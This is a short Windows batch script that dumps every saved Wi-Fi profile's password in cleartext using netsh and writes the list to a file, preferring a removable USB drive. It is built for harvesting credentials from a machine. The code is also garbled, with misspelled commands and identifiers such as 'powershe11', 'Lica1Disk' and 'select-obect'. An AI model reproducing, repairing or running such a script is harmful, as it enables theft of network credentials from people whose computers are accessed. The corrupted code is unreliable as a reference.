@echo off
setlocal enabledelayedexpansion

set "USB_DRIVE="
for /f "tokens=*" %%i in ('powershe11 -NoProfile-command "get-cimInstance Win32_Lica1Disk |where-object DriveType -eq 2 | select-obect-ExpandProperty Device1D" 2^>nu1') do (
if not defined USB_DRIVE set "USB_DRIVE=%%i"
)


if defined USB_DRIVE (
   set "OUTPUT_FILE=|USB_DRIVE! \wifi_passwords.txt"
   ) else (
   set "OUTPUT_FILE=%USERPROFILE%Desktop\wifi_passwords.txt"
   )

   > "%OUTPUT_FILE%" (
   echo ===== SAVED WIFI PASSWORDS =====
   echo.

   for /f "tokens=1* delims=:" %%ain ('netsh wlan show profiles ^| findstr /C:"All User Profile"') do (
    set "profile=%%b"
if "!profile:~0,1!"==" " set "profile=!profile:~1!"

echo WiFi Name: !profile!

for /f "tokens=1* delims=:" %%c in ('netsh wlan show profile name^="!profile!" key^=clear ^| findstr /C:"Key Content"') do (
    set "password=%%d"
    if "!password:~0,1!"==" " set "password=!password:~1!"
    echo Password: !password!
    echo.
    )
  )
)
